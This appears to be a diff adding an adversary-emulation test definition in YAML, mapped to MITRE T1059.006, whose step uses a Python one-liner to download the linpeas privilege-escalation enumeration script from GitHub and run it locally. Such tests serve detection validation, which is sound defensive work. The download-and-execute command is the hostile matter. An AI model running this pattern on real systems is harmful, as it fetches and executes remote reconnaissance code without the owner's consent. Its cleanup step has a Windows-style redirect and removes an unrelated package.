@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: Execute shell script via python's command mode arguement
+description: Download and execute shell script and write to file then execute locally using Python -c (command mode)
+args:
+    - name: script_url
+      type: string
+      default: https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh
+    - name: payload_file_name
+      type: string
+      default: T1059.006-payload
+    - name: executor
+      type: string
+      default: sh
+    - name: script_args
+      type: string
+      default: -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles
+uuid: 3a95cdb2-c6ea-4761-b24e-02b71889b8bb
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1059: Command and Scripting Interpreter'
+    subtechniques:
+        - 'T1059.006: Python'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: execute-shell-script-via-python's-command-mode-arguement
+      inline: |
+        which_python=$(which python || which python3 || which python3.9 || which python2)
+        $which_python -c 'import requests;import os;url = "{{.Args.script_url}}";malicious_command = "{{.Args.executor}} {{.Args.payload_file_name}} {{.Args.script_args}}";session = requests.session();source = session.get(url).content;fd = open("{{.Args.payload_file_name}}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+      executor: sh
+      cleanup:
+        inline: "rm {{.Args.payload_file_name}} \npip-autoremove pypykatz >nul 2> nul\n"
+        executor: sh
